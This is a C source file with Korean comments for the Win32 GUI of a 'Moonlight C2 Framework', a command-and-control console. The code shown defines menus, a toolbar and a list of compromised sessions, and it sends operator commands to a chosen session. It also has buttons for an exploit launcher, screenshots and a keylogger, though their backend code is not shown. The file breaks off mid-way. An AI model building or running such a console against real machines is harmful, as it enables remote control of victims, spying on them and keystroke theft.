/*
 * Moonlight C2 Framework - GUI 서버 (해커 테마)
 * 타겟: Windows 7+
 * 기능: 세션 관리, 실시간 모니터링, Exploit 런처, 스크린샷 뷰어
 */

#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <time.h>
#include "server_backend.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

// ============================================================================
// 색상 테마 (다크 해커 스타일)
// ============================================================================
#define COLOR_BG_DARK       RGB(15, 15, 20)
#define COLOR_BG_MEDIUM     RGB(25, 25, 35)
#define COLOR_BG_LIGHT      RGB(35, 35, 45)
#define COLOR_ACCENT        RGB(0, 255, 100)    // 네온 그린
#define COLOR_ACCENT_RED    RGB(255, 50, 50)    // 네온 레드
#define COLOR_TEXT          RGB(200, 200, 200)
#define COLOR_TEXT_DIM      RGB(120, 120, 120)
#define COLOR_BORDER        RGB(50, 255, 100)

// ============================================================================
// 윈도우 핸들 및 글로벌 변수
// ============================================================================
HWND g_hMainWindow = NULL;
HWND g_hListViewSessions = NULL;
HWND g_hEditLog = NULL;
HWND g_hEditCommand = NULL;
HWND g_hStatusBar = NULL;
HWND g_hToolbar = NULL;
HWND g_hExploitCombo = NULL;
HWND g_hScreenshotPanel = NULL;

HBRUSH g_hBrushDark = NULL;
HBRUSH g_hBrushMedium = NULL;
HFONT g_hFontMain = NULL;
HFONT g_hFontBold = NULL;
HFONT g_hFontMono = NULL;

HIMAGELIST g_hImageList = NULL;

// 서버 스레드
HANDLE g_hServerThread = NULL;
BOOL g_ServerRunning = FALSE;

// ============================================================================
// 리소스 ID
// ============================================================================
#define IDC_LISTVIEW_SESSIONS   1001
#define IDC_EDIT_LOG            1002
#define IDC_EDIT_COMMAND        1003
#define IDC_BTN_START_SERVER    1004
#define IDC_BTN_STOP_SERVER     1005
#define IDC_BTN_SEND_COMMAND    1006
#define IDC_BTN_REFRESH         1007
#define IDC_COMBO_EXPLOIT       1008
#define IDC_BTN_LAUNCH_EXPLOIT  1009
#define IDC_STATUSBAR           1010
#define IDC_SCREENSHOT_PANEL    1011
#define IDC_BTN_SCREENSHOT      1012
#define IDC_BTN_KEYLOGGER       1013
#define IDC_BTN_PROCESSES       1014

// 메뉴 ID
#define IDM_FILE_EXIT           2001
#define IDM_SERVER_START        2002
#define IDM_SERVER_STOP         2003
#define IDM_VIEW_SESSIONS       2004
#define IDM_VIEW_LOG            2005
#define IDM_HELP_ABOUT          2006

// ============================================================================
// 함수 선언
// ============================================================================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void InitializeGUI(HWND hwnd);
void CreateMainMenu(HWND hwnd);
void CreateToolbar(HWND hwnd);
void CreateSessionListView(HWND hwnd);
void CreateLogWindow(HWND hwnd);
void CreateCommandPanel(HWND hwnd);
void CreateExploitPanel(HWND hwnd);
void CreateScreenshotPanel(HWND hwnd);
void CreateStatusBar(HWND hwnd);
void AddLogMessage(const char* message, COLORREF color);
void UpdateSessionList();
void StartC2Server();
void StopC2Server();
void SendCommandToClient(int sessionId, const char* command);
void LaunchExploit();
void RequestScreenshot(int sessionId);
DWORD WINAPI ServerThread(LPVOID param);

// ============================================================================
// WinMain 진입점
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Common Controls 초기화
    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES;
    InitCommonControlsEx(&icc);
    
    // 윈도우 클래스 등록
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(COLOR_BG_DARK);
    wc.lpszClassName = "MoonlightC2Class";
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    
    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL, "Window Registration Failed!", "Error", MB_ICONERROR);
        return 0;
    }
    
    // 메인 윈도우 생성
    g_hMainWindow = CreateWindowEx(
        0,
        "MoonlightC2Class",
        "∴ Moonlight C2 Framework ∴ [HACKER MODE]",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        1400, 900,
        NULL, NULL, hInstance, NULL
    );
    
    if (g_hMainWindow == NULL) {
        MessageBox(NULL, "Window Creation Failed!", "Error", MB_ICONERROR);
        return 0;
    }
    
    // 다크 테마 브러시 생성
    g_hBrushDark = CreateSolidBrush(COLOR_BG_DARK);
    g_hBrushMedium = CreateSolidBrush(COLOR_BG_MEDIUM);
    
    // 폰트 생성
    g_hFontMain = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
    
    g_hFontBold = CreateFont(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
    
    g_hFontMono = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
    
    ShowWindow(g_hMainWindow, nCmdShow);
    UpdateWindow(g_hMainWindow);
    
    // 메시지 루프
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // 정리
    DeleteObject(g_hBrushDark);
    DeleteObject(g_hBrushMedium);
    DeleteObject(g_hFontMain);
    DeleteObject(g_hFontBold);
    DeleteObject(g_hFontMono);
    
    return (int)msg.wParam;
}

// ============================================================================
// 윈도우 프로시저
// ============================================================================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            InitializeGUI(hwnd);
            AddLogMessage("[*] Moonlight C2 Framework initialized", COLOR_ACCENT);
            AddLogMessage("[*] Ready to start C2 server...", COLOR_TEXT);
            break;
            
        case WM_COMMAND: {
            int wmId = LOWORD(wParam);
            
            switch (wmId) {
                case IDC_BTN_START_SERVER:
                case IDM_SERVER_START:
                    StartC2Server();
                    break;
                    
                case IDC_BTN_STOP_SERVER:
                case IDM_SERVER_STOP:
                    StopC2Server();
                    break;
                    
                case IDC_BTN_SEND_COMMAND: {
                    char command[512];
                    GetWindowText(g_hEditCommand, command, sizeof(command));
                    
                    if (strlen(command) > 0) {
                        int selectedIndex = ListView_GetNextItem(g_hListViewSessions, -1, LVNI_SELECTED);
                        
                        if (selectedIndex >= 0) {
                            LVITEM item;
                            char sessionIdStr[16];
                            item.mask = LVIF_TEXT;
                            item.iItem = selectedIndex;
                            item.iSubItem = 0;
                            item.pszText = sessionIdStr;
                            item.cchTextMax = sizeof(sessionIdStr);
                            
                            if (ListView_GetItem(g_hListViewSessions, &item)) {
                                int sessionId = atoi(sessionIdStr);
                                SendCommandToClient(sessionId, command);
                                SetWindowText(g_hEditCommand, "");
                            }
                        } else {
                            AddLogMessage("[!] No session selected", COLOR_ACCENT_RED);
                        }
                    }
                    break;
                }
                
                case IDC_BTN_LAUNCH_EXPLOIT:
                    LaunchExploit();
                    break;
                    
                case IDC_BTN_SCREENSHOT: {
                    int selectedIndex = ListView_GetNextItem(g_hListViewSessions, -1, LVNI_SELECTED);
                    if (selectedIndex >= 0) {
                        LVITEM item;
                        char sessionIdStr[16];
                        item.mask = LVIF_TEXT;
                        item.iItem = selectedIndex;
                        item.iSubItem = 0;
                        item.pszText = sessionIdStr;
                        item.cchTextMax = sizeof(sessionIdStr);
                        
                        if (ListView_GetItem(g_hListViewSessions, &item)) {
                            int sessionId = atoi(sessionIdStr);
                            RequestScreenshot(sessionId);
                        }
                    }
                    break;
                }
                
                case IDC_BTN_REFRESH:
                    UpdateSessionList();
                    break;
                    
                case IDM_FILE_EXIT:
                    if (g_ServerRunning) {
                        StopC2Server();
                    }
                    PostQuitMessage(0);
                    break;
                    
                case IDM_HELP_ABOUT:
                    MessageBox(hwnd, 
                              "Moonlight C2 Framework v2.0\n\n"
                              "Advanced Command & Control System\n"
                              "For Authorized Penetration Testing Only\n\n"
                              "⚠ Use Responsibly ⚠",
                              "About Moonlight C2",
                              MB_ICONINFORMATION);
                    break;
            }
            break;
        }
        
        case WM_CTLCOLOREDIT:
        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, COLOR_TEXT);
            SetBkColor(hdcStatic, COLOR_BG_MEDIUM);
            return (INT_PTR)g_hBrushMedium;
        }
        
        case WM_SIZE: {
            // 상태바 크기 조정
            SendMessage(g_hStatusBar, WM_SIZE, 0, 0);
            
            // 컨트롤 재배치
            RECT rcClient;
            GetClientRect(hwnd, &rcClient);
            
            int width = rcClient.right - rcClient.left;
            int height = rcClient.bottom - rcClient.top;
            
            // 툴바
            SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
            RECT rcToolbar;
            GetWindowRect(g_hToolbar, &rcToolbar);
            int toolbarHeight = rcToolbar.bottom - rcToolbar.top;
            
            // 레이아웃 재계산
            SetWindowPos(g_hListViewSessions, NULL, 10, toolbarHeight + 10, 
                        width - 20, height / 2 - toolbarHeight - 60, SWP_NOZORDER);
            
            SetWindowPos(g_hEditLog, NULL, 10, height / 2 + 10, 
                        width - 20, height / 2 - 150, SWP_NOZORDER);
            
            SetWindowPos(g_hEditCommand, NULL, 10, height - 110, 
                        width - 220, 30, SWP_NOZORDER);
            
            break;
        }
        
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    
    return 0;
}

// ============================================================================
// GUI 초기화
// ============================================================================
void InitializeGUI(HWND hwnd) {
    CreateMainMenu(hwnd);
    CreateToolbar(hwnd);
    CreateSessionListView(hwnd);
    CreateLogWindow(hwnd);
    CreateCommandPanel(hwnd);
    CreateExploitPanel(hwnd);
    CreateStatusBar(hwnd);
}

// ============================================================================
// 메인 메뉴 생성
// ============================================================================
void CreateMainMenu(HWND hwnd) {
    HMENU hMenuBar = CreateMenu();
    HMENU hFileMenu = CreateMenu();
    HMENU hServerMenu = CreateMenu();
    HMENU hViewMenu = CreateMenu();
    HMENU hHelpMenu = CreateMenu();
    
    AppendMenu(hFileMenu, MF_STRING, IDM_FILE_EXIT, "Exit\tAlt+F4");
    
    AppendMenu(hServerMenu, MF_STRING, IDM_SERVER_START, "Start Server\tF5");
    AppendMenu(hServerMenu, MF_STRING, IDM_SERVER_STOP, "Stop Server\tF6");
    
    AppendMenu(hViewMenu, MF_STRING, IDM_VIEW_SESSIONS, "Sessions");
    AppendMenu(hViewMenu, MF_STRING, IDM_VIEW_LOG, "Activity Log");
    
    AppendMenu(hHelpMenu, MF_STRING, IDM_HELP_ABOUT, "About");
    
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hFileMenu, "File");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hServerMenu, "Server");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hViewMenu, "View");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hHelpMenu, "Help");
    
    SetMenu(hwnd, hMenuBar);
}

// ============================================================================
// 툴바 생성
// ============================================================================
void CreateToolbar(HWND hwnd) {
    g_hToolbar = CreateWindowEx(0, TOOLBARCLASSNAME, NULL,
                                WS_CHILD | WS_VISIBLE | TBSTYLE_FLAT | TBSTYLE_TOOLTIPS,
                                0, 0, 0, 0,
                                hwnd, (HMENU)IDC_BTN_START_SERVER,
                                GetModuleHandle(NULL), NULL);
    
    SendMessage(g_hToolbar, TB_BUTTONSTRUCTSIZE, sizeof(TBBUTTON), 0);
    
    TBBUTTON tbb[5];
    ZeroMemory(tbb, sizeof(tbb));
    
    tbb[0].iBitmap = 0;
    tbb[0].idCommand = IDC_BTN_START_SERVER;
    tbb[0].fsState = TBSTATE_ENABLED;
    tbb[0].fsStyle = TBSTYLE_BUTTON;
    tbb[0].iString = (INT_PTR)"Start Server";
    
    tbb[1].iBitmap = 1;
    tbb[1].idCommand = IDC_BTN_STOP_SERVER;
    tbb[1].fsState = TBSTATE_ENABLED;
    tbb[1].fsStyle = TBSTYLE_BUTTON;
    tbb[1].iString = (INT_PTR)"Stop Server";
    
    tbb[2].fsStyle = TBSTYLE_SEP;
    
    tbb[3].iBitmap = 2;
    tbb[3].idCommand = IDC_BTN_REFRESH;
    tbb[3].fsState = TBSTATE_ENABLED;
    tbb[3].fsStyle = TBSTYLE_BUTTON;
    tbb[3].iString = (INT_PTR)"Refresh";
    
    tbb[4].iBitmap = 3;
    tbb[4].idCommand = IDC_BTN_SCREENSHOT;
    tbb[4].fsState = TBSTATE_ENABLED;
    tbb[4].fsStyle = TBSTYLE_BUTTON;
    tbb[4].iString = (INT_PTR)"Screenshot";
    
    SendMessage(g_hToolbar, TB_ADDBUTTONS, 5, (LPARAM)&tbb);
    SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
}

// ============================================================================
// 세션 리스트뷰 생성
// ============================================================================
void CreateSessionListView(HWND hwnd) {
    g_hListViewSessions = CreateWindow(WC_LISTVIEW, "",
                                      WS_CHILD | WS_VISIBLE | WS_BORDER | 
                                      LVS_REPORT | LVS_SINGLESEL,
                                      10, 50, 1360, 350,
                                      hwnd, (HMENU)IDC_LISTVIEW_SESSIONS,
                                      GetModuleHandle(NULL), NULL);
    
    SendMessage(g_hListViewSessions, WM_SETFONT, (WPARAM)g_hFontMain, TRUE);
    
    // Extended styles
    ListView_SetExtendedListViewStyle(g_hListViewSessions, 
                                     LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
    
    // 컬럼 추가
    LVCOLUMN lvc;
    lvc.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
    
    lvc.pszText = "ID";
    lvc.cx = 50;
    ListView_InsertColumn(g_hListViewSessions, 0, &lvc);
    
    lvc.pszText = "IP Address";
    lvc.cx = 150;
    ListView_InsertColumn(g_hListViewSessions, 1, &lvc);
    
    lvc.pszText = "Hostname";
    lvc.cx = 180;
    ListView_InsertColumn(g_hListViewSessions, 2, &lvc);
    
    lvc.pszText = "Username";
    lvc.cx = 150;
    ListView_InsertColumn(g_hListViewSessions, 3, &lvc);
    
    lvc.pszText = "OS Version";
    lvc.cx = 200;
    ListView_InsertColumn(g_hListViewSessions, 4, &lvc);
    
    lvc.pszText = "PID";
    lvc.cx = 80;
    ListView_InsertColumn(g_hListViewSessions, 5, &lvc);
    
    lvc.pszText = "Status";
    lvc.cx = 100;
    ListView_InsertColumn(g_hListViewSessions, 6, &lvc);
    
    lvc.pszText = "Last Seen";
    lvc.cx = 150;
    ListView_InsertColumn(g_hListViewSessions, 7, &lvc);
}

// (계속...)
